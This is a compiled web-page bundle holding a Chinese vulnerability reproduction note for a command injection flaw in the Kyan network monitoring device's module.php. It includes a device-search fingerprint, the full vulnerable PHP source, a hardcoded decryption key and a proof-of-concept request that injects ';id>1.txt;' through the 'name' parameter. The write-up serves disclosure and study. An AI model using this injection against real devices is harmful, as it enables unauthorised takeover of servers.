import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{o as e,c as i,e as n}from"./app-58e4a7d6.js";const d={},l=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Kyan 网络监控设备 module.php 可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程命令执行漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Kyan
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Kyan设计&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191751171.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的文件: <code>/module.php</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
require_once &#39;config.php&#39;;
require_once &#39;functions.php&#39;;
require_once &#39;international.php&#39;;
session_start();
auth_check();

$BASH = &quot;&quot;;
if (is_windows()) {
	$BASH = &quot;c:\\\\cygwin\\\\bin\\\\bash --login -c &quot;;
	$PREFIX = &quot;/cygdrive/z/writable/&quot;;
	$PREFIX2 = &quot;/cygdrive/z/&quot;;
} else {
	$BASH = &quot;/bin/bashsuid -p -c &quot;;
	$PREFIX = &quot;/config/&quot;;
	$PREFIX2 = &quot;/&quot;;
}
$encrypt_key = &#39;enc@leadmeet&#39;;
if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;) {
	if (!isset($_FILES[&#39;fileupload&#39;])) {
		show_error(lang_get(&#39;no file specified&#39;));
		exit;
	}
	if ($_FILES[&#39;fileupload&#39;][&#39;size&#39;] == 0) {
		show_error(lang_get(&#39;file size is zero&#39;));
		exit;
	}
	$fileupload = $_FILES[&#39;fileupload&#39;];
	$destdir = $PREFIX.&#39;pkgs&#39;;
	$pkg_extract_dir = $PREFIX2.&#39;pkgs&#39;;
	$tmpname = $fileupload[&#39;tmp_name&#39;];
	if (is_windows()) {
		$bn = basename($tmpname);
		$command = &quot;move /Y \\&quot;&quot;. $tmpname . &quot;\\&quot; c:\\\\cygwin\\\\dev\\\\shm\\\\&quot; . $bn;
		shell_exec($command);
		$tmpname = &quot;/dev/shm/&quot; . $bn;
	}
	shell_exec($BASH.&quot;\\&quot;mkdir -p /dev/shm/upload &amp;&amp; chmod -R 777 /dev/shm/ \\&quot;&quot;);
	exec($BASH.&quot;\\&quot;cd /dev/shm/upload &amp;&amp; ( bzcat &quot; . $tmpname . &quot; | openssl bf-cbc -d -k &quot; . $encrypt_key . &quot; | cpio -idu )\\&quot;&quot;, $output, $ret);
	if($ret &lt;&gt; 0)
	{
		show_error(lang_get(&#39;Extract file failed&#39;));
		exec($BASH.&quot;\\&quot;rm -rf /dev/shm/upload\\&quot;&quot;);
		exit;
	}
	exec($BASH.&quot;\\&quot;cd /dev/shm/upload &amp;&amp; md5sum -c md5sum\\&quot;&quot;, $output, $ret);
	if($ret &lt;&gt; 0)
	{
		show_error(lang_get(&#39;MD5 check failed&#39;));
		exec($BASH.&quot;\\&quot;rm -rf /dev/shm/upload\\&quot;&quot;);
		exit;
	}
	if (is_windows())
		$dh = opendir(&#39;c:\\\\cygwin\\\\dev\\\\shm\\\\upload&#39;);
	else
		$dh = opendir(&#39;/dev/shm/upload&#39;);
	if(!$dh)
	{
		show_error(lang_get(&#39;can not open dest dir to copy&#39;));
		exec($BASH.&quot;\\&quot;rm -rf /dev/shm/upload\\&quot;&quot;);
		exit;
	}
	exec($BASH.&quot;\\&quot;touch /tmp/mmap_watch_pause\\&quot;&quot;);
	while($file = readdir($dh))
	{
		if(is_dir($file)) continue;
		$file = trim($file);
		if(ereg(&#39;\\.pkg$&#39;, $file))
		{
			$filetitle = basename($file, &#39;.pkg&#39;);
			$extract_dir = $pkg_extract_dir  . &#39;/&#39; . $filetitle;
			exec($BASH.&quot;\\&quot;&quot; . $extract_dir . &quot;/.init stop\\&quot;&quot;);
			exec($BASH.&quot;\\&quot;mkdir -p &quot; . $destdir . &quot; &amp;&amp; mv -f /dev/shm/upload/&quot; . $file . &quot; &quot; . $destdir . &quot;\\&quot;&quot;);
			exec($BASH.&quot;\\&quot;rm -rf &quot; . $extract_dir . &quot; &amp;&amp; mkdir -p &quot; . $extract_dir . &quot; &amp;&amp; cd &quot; . $extract_dir . &quot; &amp;&amp; bzcat &quot; . $destdir . &#39;/&#39; . $file . &quot; | cpio -idu \\&quot;&quot;);
		}
	}
	if (!is_windows())
		exec($BASH.&quot;\\&quot;/sbin/ldconfig\\&quot;&quot;);
	else
		exec($BASH.&quot;\\&quot;rm -rf &quot;. $tmpname .&quot;\\&quot;&quot;);
	exec($BASH.&quot;\\&quot;rm -f /tmp/mmap_watch_pause\\&quot;&quot;);
	exec($BASH.&quot;\\&quot;rm -rf /dev/shm/upload\\&quot;&quot;);
}
if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; isset($_GET[&#39;name&#39;])) {
	$cmd = $_GET[&#39;cmd&#39;];
	if ($cmd == &#39;delete&#39;) {
		$name = $_GET[&#39;name&#39;];
		exec($BASH.&quot;\\&quot;rm -f &quot;.$PREFIX.&quot;pkgs/&quot;.$name.&quot;\\&quot;&quot;);
		if (is_windows())
			exec($BASH.&quot;\\&quot;rm -rf &quot;.$PREFIX2.&quot;pkgs/&quot;.$name.&quot;\\&quot;&quot;);
	}
}
print_html_begin(&#39;module&#39;);
echo &quot;&lt;body&gt;\\n&quot;;
echo &quot;&lt;table style=\\&quot;width:500px\\&quot;  border=&#39;0&#39; align=&#39;center&#39; cellpadding=&#39;3&#39; cellspacing=&#39;1&#39;&gt;\\n&quot;;
echo &quot;&lt;th colspan=2&gt;&quot;.lang_get(&#39;modules&#39;).&quot;&lt;/th&gt;\\n&quot;;
echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.lang_get(&#39;name&#39;).&quot;&lt;/td&gt;&lt;td&gt;&quot;.lang_get(&#39;operation&#39;).&quot;&lt;/td&gt;&lt;/tr&gt;\\n&quot;;
if (is_windows())
	$dh = opendir(&#39;z:\\\\writable\\\\pkgs&#39;);
else
	$dh = opendir(&#39;/config/pkgs&#39;);
if ($dh) {
	while ($file = readdir($dh)) {
		if (is_dir($file))
			continue;
		$file = trim($file);
		if (!ereg(&#39;\\.pkg$&#39;, $file))
			continue;
		$filetitle = basename($file, &#39;.pkg&#39;);
		echo &quot;&lt;tr&gt;&lt;td align=center&gt;&quot;.$filetitle.&quot;&lt;/td&gt;&lt;td&gt;&quot;;
		if (user_is_admin())
			echo &quot;&lt;a href=\\&quot;/module.php?cmd=delete&amp;name=&quot;.$filetitle.&quot;.pkg\\&quot;&gt;&quot;.lang_get(&#39;delete&#39;).&quot;&lt;/a&gt;&quot;;
		echo &quot;&lt;/td&gt;&lt;/tr&gt;\\n&quot;;
	}
}
echo &quot;&lt;/table&gt;\\n&lt;br&gt;\\n&quot;;
echo &quot;&lt;table style=\\&quot;width:500px\\&quot;  border=&#39;0&#39; align=&#39;center&#39; cellpadding=&#39;3&#39; cellspacing=&#39;1&#39;&gt;\\n&quot;;
echo &quot;&lt;form action=\\&quot;&quot;.$_server[&#39;php_self&#39;].&quot;\\&quot; method=\\&quot;post\\&quot; enctype=\\&quot;multipart/form-data\\&quot;&gt;\\n&quot;;
echo &quot;&lt;input type=\\&quot;hidden\\&quot; name=\\&quot;max_file_size\\&quot; value=\\&quot;200000000\\&quot;&gt;\\n&quot;;
echo &quot;&lt;th align=\\&quot;center\\&quot; colspan=\\&quot;2\\&quot;&gt;&quot;.lang_get(&#39;modules to upload&#39;).&quot;&lt;/th&gt;&quot;;
echo &quot;&lt;tr&gt; &lt;td align=\\&quot;right\\&quot; width=\\&quot;50%\\&quot;&gt;&quot; .lang_get(&#39;select file&#39;).&quot;&lt;/td&gt;&lt;td align=\\&quot;left\\&quot;&gt; &lt;input type=\\&quot;file\\&quot; name=\\&quot;fileupload\\&quot;&gt; &lt;/td&gt;&lt;/tr&gt;&quot;;
echo &quot;&lt;tr&gt; &lt;td align=\\&quot;center\\&quot; colspan=\\&quot;2\\&quot;&gt;  &lt;input type=\\&quot;submit\\&quot; name=\\&quot;submit\\&quot; value=&quot;.lang_get(&#39;upload&#39;).&quot;&gt; &lt;/td&gt;&lt;/tr&gt;&quot;;
echo &quot;&lt;/form&gt;\\n&lt;/table&gt;\\n&quot;;
echo &quot;&lt;/body&gt;\\n&quot;;
print_html_end();
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中需要注意的部分</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; isset($_GET[&#39;name&#39;])) {
	$cmd = $_GET[&#39;cmd&#39;];
	if ($cmd == &#39;delete&#39;) {
		$name = $_GET[&#39;name&#39;];
		exec($BASH.&quot;\\&quot;rm -f &quot;.$PREFIX.&quot;pkgs/&quot;.$name.&quot;\\&quot;&quot;);
		if (is_windows())
			exec($BASH.&quot;\\&quot;rm -rf &quot;.$PREFIX2.&quot;pkgs/&quot;.$name.&quot;\\&quot;&quot;);
	}
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>参数均可控，构造POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/module.php?cmd=delete&amp;name=;id&gt;1.txt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191751384.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16),u=[l];function s(a,o){return e(),i("div",null,u)}const c=t(d,[["render",s],["__file","Kyan 网络监控设备 module.php 远程命令执行漏洞.html.vue"]]);export{c as default};
